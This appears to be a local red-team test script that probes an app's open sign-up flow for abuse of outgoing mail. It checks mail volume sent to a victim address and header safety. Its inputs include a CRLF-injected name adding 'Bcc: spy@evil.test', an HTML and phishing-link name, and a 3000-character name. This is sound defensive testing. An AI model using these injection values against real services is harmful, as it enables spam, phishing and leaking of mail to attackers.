"""Red-team 2026-11-09: real SMTP path (local sink on 127.0.0.1:$SINK_PORT) for open self-serve sign-up (#462): what mails does an anonymous visitor cause to a victim
address? existing-account notice and verification mail volume per address, header safety of the attacker-chosen name, body content. LOCAL ONLY; nothing leaves the machine."""
import os, sys, tempfile
from pathlib import Path
ROOT = Path(__file__).resolve().parent.parent; sys.path.insert(0, str(ROOT))
db = Path(tempfile.mkdtemp())/"s.db"
os.environ.update({"AMLKIT_DB": str(db), "STRIPE_SECRET_KEY": "sk_test_x", "STRIPE_WEBHOOK_SECRET": "whsec_x", "STRIPE_PRICE_STARTER": "price_s",
                   "AMLKIT_SMTP_HOST": "127.0.0.1", "AMLKIT_SMTP_PORT": os.environ.get("SINK_PORT", "2526"), "AMLKIT_SMTP_USE_TLS": "0"})
import logging; logging.disable(logging.CRITICAL)
from fastapi.testclient import TestClient
from amlkit import auth
from amlkit.api.app import app, limiter
def reg(email, org, name="Eve"):
    c = TestClient(app, follow_redirects=False, raise_server_exceptions=False); c.get("/register-organization"); limiter.reset()
    return c.post("/register-organization", data={"org_name": org, "name": name, "email": email, "password": "Str0ng!Passw0rd", "csrf_token": c.cookies.get(auth.CSRF_COOKIE)})
print("owner registers:", reg("owner@victim.test", "Victim Real", "Olivia Owner").status_code)
for i in range(5): reg("owner@victim.test", f"Squat {i}", "Mallory\r\nBcc: spy@evil.test")     # existing address, hostile name
for i in range(5): reg("fresh@victim.test", f"Fresh {i}", "Mallory <b>bold</b> https://evil.test/pay")  # same new address registered 5 times
print("done; inspect sink log")
r = reg("crlf@victim.test", "Crlf Org", "Mallory\r\nBcc: spy@evil.test"); print("CRLF in name on a new address ->", r.status_code, "| form error shown:", any(w in r.text.lower() for w in ("invalid", "newline", "control", "name")))
r = reg("long@victim.test", "Long Org", "A"*3000); print("3000-char name ->", r.status_code)
